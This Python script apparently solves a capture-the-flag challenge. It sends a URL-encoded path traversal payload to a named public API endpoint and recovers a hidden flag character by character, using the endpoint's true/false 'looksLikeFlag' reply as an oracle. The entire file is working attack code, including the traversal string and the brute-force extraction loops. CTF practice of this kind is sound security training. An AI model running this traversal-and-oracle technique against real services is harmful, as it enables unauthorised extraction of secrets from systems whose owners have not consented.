import requests
import json
import string
code= "%2E%2E/looksLikeFlag/?flag="

# header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"}
# a-z0-9_

## 往右邊長
curString =""
while 1:
    flag = False
    for character in string.ascii_lowercase +string.digits[0:] + "_":
        curString+=character
        print("curCharacter",character)
        print("curString",curString)
        tmp=code+curString
        my_data = {'text': tmp}
        # 將資料加入 POST 請求中
        r = requests.post('http://splitline.tw:5000/public_api', json= my_data)
        # r = requests.post('http://splitline.tw:5000/public_api',headers = header)
        # r = requests.get('http://splitline.tw:5000/')
        result = json.loads(r.text)['looksLikeFlag']

        print("r",result)
        if not result:
            curString = curString[:-1]
        else:
            print("!!!!!!!!!flag true")
            flag = True
            break;
    if flag == False:
        break;
    

## 往左邊長
print("------left")

while 1:
    flag = False
    for character in string.ascii_lowercase +string.digits[0:] + "_":
        print("curCharacter",character)
        curString=character + curString
        tmp=code+curString
        print("curString",curString)
        my_data = {'text': tmp}
        # 將資料加入 POST 請求中
        r = requests.post('http://splitline.tw:5000/public_api', json= my_data)
        # r = requests.post('http://splitline.tw:5000/public_api',headers = header)
        # r = requests.get('http://splitline.tw:5000/')
        result = json.loads(r.text)['looksLikeFlag']
        print("r",result)
        if not result:
            curString = curString[1:]
        else:
            flag = True
            print("!!!!!!!!!flag true")
            break;
    if flag == False:
        break;

print("flag:",curString)
